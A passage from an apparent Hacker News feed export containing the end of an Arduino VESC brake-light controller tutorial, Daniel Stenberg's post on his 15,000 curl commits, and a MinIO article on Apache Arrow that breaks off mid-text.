2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520(this-%253EcommandHandlers%255Bi%255D.commandId%2520%253D%253D%2520commandId)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bi%255D.callback(payload%252C%2520payloadSize)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520VESC%2520Packet%253A%2520%2522)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.println(command)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520true%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520false%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%257D%250A%250Aprivate%253A%250A%2520%2520%2520%2520HardwareSerial%2520*port%253B%250A%2520%2520%2520%2520vesc_command_handler%2520*commandHandlers%253B%250A%2520%2520%2520%2520uint8_t%2520commandHandlerSize%253B%250A%250A%2520%2520%2520%2520static%2520bool%2520unpackPayload(uint8_t%2520*packet%252C%2520uint16_t%2520length%252C%2520uint8_t%2520*payload)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcMessage%2520%253D%25200%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcPayload%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%253D%2520packet%255Blength%2520-%25203%255D%2520%253C%253C%25208u%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%2526%253D%25200xFF00u%253B%250A%2520%2520%2520%2520%2520%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--26-.png" alt="carbon--26-"></a></p>
<!--kg-card-end: markdown--><h3 id="final-wrap">Final Wrap</h3><p>After having a way to hook into received VESC Commands, it's pretty easy to implement our simple LED dimming logic.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523include%2520%253CArduino.h%253E%250A%250A%2523define%2520DEBUG_PORT%2520Serial%250A%250A%2523include%2520%2522VescUart.h%2522%250A%250A%2523define%2520LED_DIMMER_PWM%25205%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520LED%2520DIMMER%2520PWM%2520PIN%2520(PWM%2520Compatible%2520PIN)%250A%2523define%2520LED_STATE_ON_POWER%2520HIGH%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520HIGH%252FLOW%2520when%2520power%2520is%2520applied%2520to%2520MCU%250A%2523define%2520LED_BRIGHTNESS_ON_IDLE%2520115%2520%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%2523define%2520LED_BRIGHTNESS_ON_BRAKE%2520255%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%250A%2523define%2520THROTTLE_MIDDLE%2520127%250A%250AVescUart%2520*vescUart%253B%250A%250Avoid%2520handleSetChuckDataCommand(uint8_t%2520*payload%252C%2520uint16_t%2520length)%2520%257B%250A%2520%2520%2520%2520uint8_t%2520vescThrottleValue%2520%253D%2520payload%255B2%255D%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520new%2520throttle%2520value%253A%2520%2522)%253B%250A%2520%2520%2520%2520DEBUG_PORT.println(vescThrottleValue)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(vescThrottleValue%2520%253C%2520THROTTLE_MIDDLE)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_BRAKE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520setup()%2520%257B%250A%2520%2520%2520%2520pinMode(LED_DIMMER_PWM%252C%2520OUTPUT)%253B%250A%250A%2520%2520%2520%2520Serial1.begin(115200)%253B%250A%2520%2520%2520%2520vescUart%2520%253D%2520new%2520VescUart(%2526Serial1)%253B%250A%250A%2520%2520%2520%2520vescUart-%253EaddCommandHandler(COMM_SET_CHUCK_DATA%252C%2520handleSetChuckDataCommand)%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.begin(9600)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(LED_STATE_ON_POWER%2520%253D%253D%2520HIGH)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520digitalWrite(LED_DIMMER_PWM%252C%2520LOW)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520loop()%2520%257B%250A%2520%2520%2520%2520vescUart-%253EcheckVescPacket()%253B%250A%257D%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--27-.png" alt="carbon--27-"></a></p>
<!--kg-card-end: markdown--><p>Compile and upload the code into Arduino, and it is ready to go.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-78.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-78.png 600w, https://www.techprowd.com/content/images/2020/09/image-78.png 970w" sizes="(min-width: 720px) 720px"></figure><p>You probably thinking, where is the DEMO? You wrote so much code and made a whole article, but there is no demo?</p><p>This project was basically done over the evening. Because of the timezone difference between me and Lithuania is 6 hours, I will not be able to get the demo video, but I will post it on <a href="https://twitter.com/techprowd">@techprowd</a> twitter and update the article after I receive it.</p><p>The final code archive will be uploaded on my <a href="http://patreon.com/techprowd">Patreon</a> for supporters, and I will be able to help with questions regarding how to use it there too!</p><p>I would like to include a shoutout to my father's company and an online store called <a href="https://shop.3dservisas.eu/?utm_source=techprowd">3DServisas</a>. It is primarily oriented to CNC machine custom orders, electric skateboard &amp; mountainboard parts, from gear drives to skateboard trucks.</p><p>If you are interested in building your own electric skateboard or mountainboard, go check out 3DServisas precision gear drives used by many production board makers such as <a href="https://www.bioboards.se/?utm_source=techprowd">BioBoards</a> and DIY players.</p><figure><a href="http://shop.3dservisas.eu/?utm_source=techprowd"><div><p>3DServisas Shop</p><p>CNC Machined goods</p><p><img src="http://cdn.shopify.com/s/files/1/2408/6975/files/3DServisas-logo-1_0_5x_150x150.png?v=1558443632"><span>3DServisas</span></p></div><p><img src="https://cdn.shopify.com/s/files/1/2408/6975/files/logo.png?height=628&amp;pad_color=fff&amp;v=1506788900&amp;width=1200"></p></a></figure><p>Instagram page: <a href="https://www.instagram.com/3dservisas/">https://www.instagram.com/3dservisas/</a></p><h2 id="announcement">Announcement</h2><p>I don't know if you have read my previous articles, but I have opened a Patreon account so you guys could help me by supporting my projects!</p><figure><a href="https://www.patreon.com/techprowd"><div><p>Techprowd is creating articles about software/electronics/cad and other DIY ideas | Patreon</p><p>Patreon is a membership platform that makes it easy for artists and creators to get paid. Join over 200,000 creators earning salaries from over 6 million monthly patrons.</p><p><img src="https://c5.patreon.com/external/favicon/apple-touch-icon.png?v=jw6AR4Rg74"><span>Patreon</span></p></div><p><img src="https://c10.patreonusercontent.com/3/eyJ3Ijo5NjB9/patreon-media/p/campaign/5333287/24fe815b9d214942af49618835ab1447/1.png?token-time=1601769600&amp;token-hash=d-6szlXLAeDC-Z1fx0vSdZvUw7AZpC7CEZ2uYFpFrNw%3D"></p></a></figure><p>If you are not interested in supporting, at least I suggest subscribing to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517767</guid>
            <pubDate>Fri, 18 Sep 2020 15:12:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15,000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24517595">thread link</a>) | @caution
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I‚Äôve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl‚Äôs git repository</a> ‚Äì and we don‚Äôt do merge commits so this number doesn‚Äôt include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can‚Äôt count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I‚Äôm only mentioning it here because it‚Äôs even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I‚Äôve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of ‚Äúcurl time‚Äù per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren‚Äôt included in this commit number. For example, I have done over 4,400 commits in curl‚Äôs website repository.</p>



<p>With these my first 15,000 commits I‚Äôve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to ‚Äúmodern times‚Äù, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I‚Äôve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more ‚Äúoops‚Äù commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl‚Äôs top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I‚Äôve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won‚Äôt start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I‚Äôm present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There‚Äôs a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517595</guid>
            <pubDate>Fri, 18 Sep 2020 14:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Apache Arrow to Enhance the Performance of MinIO Data Lakes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517507">thread link</a>) | @jtsymonds
<br/>
September 18, 2020 | https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/ | <a href="https://web.archive.org/web/*/https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>More and more enterprises have begun or have already implemented a data lake strategy based on some of the work we did a couple of years ago. If you want to take a moment to review - you can find those posts below <a href="https://blog.min.io/modern-data-lake-with-minio-part-1/">here</a> and <a href="https://blog.min.io/modern-data-lake-with-minio-part-2/">here</a>. </p><h2 id="objective">Objective</h2><p>In this article, I am going to explain a mechanism to turbocharge the use of MinIO. Nothing changes as far as MinIO is concerned, the optimization will be on the underlying storage of our data. We are going to choose one of the latest formats to improve agility manifoldly. We are going to show the ways by which your data lake data can travel across systems without experiencing any "conversion" time. </p><h2 id="apache-arrow">Apache Arrow</h2><p>I believe understanding this article needs some basic concepts of<a href="https://arrow.apache.org/"> </a>how applications like Spark works. Let me explain it in simple terms.</p><p>Imagine you got a nice job at a location different from where you live currently and you want to relocate, as the new company demands it and pays for it. You have got the most modern televisions, refrigerators, super soft leather sofas, bed and so on. You engage a moving company, who comes, disassembles everything, packs it conveniently. They also make sure to pack as much possible in containers to fill the truck such that they can do it in a single trip. Once they reach the destination, they unpack, assembles and restore everything as it was.</p><p>The same applies to data. When I store some data in MinIO , and I need to feed it to, say, another application, say Spark, the consuming application needs to disassemble the data from MinIO data lake, pack it and transport it through the wire (or wireless), receive, unpack and re-assemble. </p><p>Let's use more technical terms for this disassembly and assembly - serialization and de-serialization of data. The unfortunate part is, both these processes are complex and time consuming. Here is a brief diagram illustrating what happens in Apache Spark when it reads data</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1944w" sizes="(min-width: 720px) 720px"><figcaption>Experimental setup. Courtesy: <a href="https://databricks.com/session/running-apache-spark-on-a-high-performance-cluster-using-rdma-and-nvme-flash">Spark Summit</a></figcaption></figure><p>You may not have noticed this problem before. Assume that MinIO is on a machine(s) on the network. We write a Spark Map-Reduce application. Eventhough the network limit is 100 GbE, we are almost getting less that 10 GbE speed. What's the use of this high speed network then? What is the potential problem which is not allowing us to utilize the full potential of the network, or at least 70-80% of it?</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1948w" sizes="(min-width: 720px) 720px"><figcaption>Additional layers, buffers and serializers</figcaption></figure><p>The issues are with the way in which Spark is retrieving the data. Look at the number of layers the data has to pass though. This creates a limit on the throughput that we can achieve. There are projects like <a href="https://crail.apache.org/">Apache Crail,</a> which are designed to address these issues.</p><h2 id="optimization-columnar-data-format">Optimization : Columnar Data Format </h2><div><p>If we think about the relocation example mentioned above, we see that the logistic company will never take the sofa as it is, they will break it down to make it easy to transport. Note that this is for transportation purposes only - if that objective is different, then disassembling the sofa might not be the right approach. </p><p>Given that the objective for a data lake is analytics - rather than transactional needs we must take that under consideration. For transactions, we often use OLTP systems like Oracle or PostGres - given that they are particularly well suited for the job. A quick review of OLAP's analytics requirements is probably in order. </p></div><figure><img src="https://blog.min.io/content/images/2020/09/Picture1.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Picture1.png 600w, https://blog.min.io/content/images/2020/09/Picture1.png 966w" sizes="(min-width: 720px) 720px"><figcaption>Introducing columnar format</figcaption></figure><p>Let's start with one of the most famous RDMBS table - the "emp" table of Oracle. The top part shows how the data is stored in RDBMS as a "relation" or "tuple". We call it a table. I am providing you two queries</p><!--kg-card-begin: markdown--><ol>
<li>select ename from emp where job = 'CLERK'</li>
<li>select sum(sal) from emp</li>
</ol>
<!--kg-card-end: markdown--><p>The first is a transactional query. It has to scan every row on the table and find out the name of the employee wherever the job is clerk. The second is an analytical query - rather than an atomic result, the goal is a general result. Unfortunately, the first and second query has to scan through all the rows, if we use RDBMS way of representation of data. If the size of data is 20 GB, all the 20 GB more or less will be scanned. This is the top part of above figure.</p><p>Let's make some changes - taking all of our columns and make them into rows. Like a transpose of a matrix - and see the bottom part of above figure, how your data will look like. Following this transposition, an entire block is just representing one column. How many blocks need to be scanned for the second analytical query? Just one block, probably around 2 GB of size. </p><p>The difference is significant? Columnar representation is what is being used in ORC (Optimized Row Columnar) and Parquet files - with the goal of making the analytics faster.</p><p>Columnar formats are easier to read, however, they pose another problem - they are usually stored in compressed format. As a result, the consuming application will need to uncompress it while reading and compress it back while writing. </p><p>Note this, as we will revisit the point later.</p><h2 id="the-science-of-reading-writing-data">The Science of Reading/Writing Data</h2><p>Let me explain briefly how reading/writing happens in a software system and what role is played by the hardware.</p><p>Microprocessors normally use two methods to connect external devices: <strong>memory mapped</strong> or <strong>port mapped</strong> I/O. </p><p>Memory mapped I/O is mapped into the same address space as program memory and/or user memory, and is accessed in the same way.</p><p>Port mapped I/O uses a separate, dedicated address space and is accessed via a dedicated set of microprocessor instructions.</p><p>In memory mapped approach, I/O devices are mapped into the system memory map along with RAM and ROM. To access a hardware device, simply read or write to those 'special' addresses using the normal memory access instructions.The advantage to this method is that every instruction which can access memory can be used to manipulate an I/O device.</p><p>Usually applications use Port mapped I/O. If we are using memory mapped I/O for a particular format, it will be faster, especially for analytical needs. When combined with our columnar data format, then it becomes even more advantageous.</p><p>Welcome to <a href="https://arrow.apache.org/">Apache Arrow</a>. </p><p>Arrow uses memory mapped I/O and avoids serialization/deserialization overheads when you convert between most of the formats while leveraging the columnar data format. </p><p>Thanks to <a href="https://wesmckinney.com/">Wes McKinney</a> for this brilliant innovation, its not a surprise that such an idea came from him and team, as he is well known as the creator of Pandas in Python. He calls Arrow as the future of data transfer.</p><h2 id="store-data-in-minio-in-arrow-format">Store Data in MinIO in Arrow Format</h2><p>This is how we are going to make MinIO even more powerful. </p><p>We are going to store that data in Arrow and then let the consuming applications read it - resulting in dramatically increased speeds. Step one has us putting the data into MinIO in Arrow format. I was using my own approach until I saw a much better implementation from <a href="https://github.com/BryanCutler">Bryan Cutler</a>, whose contributions include integrating Arrow formats to Spark as well.</p><p>We will start with a a .csv file, in this case movie ratings downloaded from the <a href="https://movielens.org/">movielens</a> site. For illustration purposes, I took about 100K rows. First, let's write a Spark program to read this CSV file and write it into Arrow format using Arrow RDD. You can get the full code from the link given towards the bottom of this article.</p><p>Step 1: build.sbt , please note the arrow dependencies</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1990w" sizes="(min-width: 720px) 720px"><figcaption>See lines 18 and 19, we have Arrow related dependencies with Spark</figcaption></figure><p>We will use Spark 3.0, with Apache Arrow 0.17.1</p><p>The ArrowRDD class has an iterator and RDD itself. For creating a custom RDD, essentially you must override mapPartitions method. You can browse the code for details. </p><p>Next, start MinIO and create a bucket named "arrowbucket". </p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Create a bucket named "arrowbucket" in MinIO</figcaption></figure><p>Let's use ArrowRDD and create an ArrowFile in local. Here is the code:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 2372w" sizes="(min-width: 720px) 720px"><figcaption>Writing Arrow file with ArrowRDD</figcaption></figure><p>Lines 22 to 34 do the main part. Compile and execute the code:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Execute the code</figcaption></figure><p>As you see from code, the Arrow format file is is generated in data directory. Let's copy it to the MinIO bucket we created earlier (bucket name is arrowbucket)</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 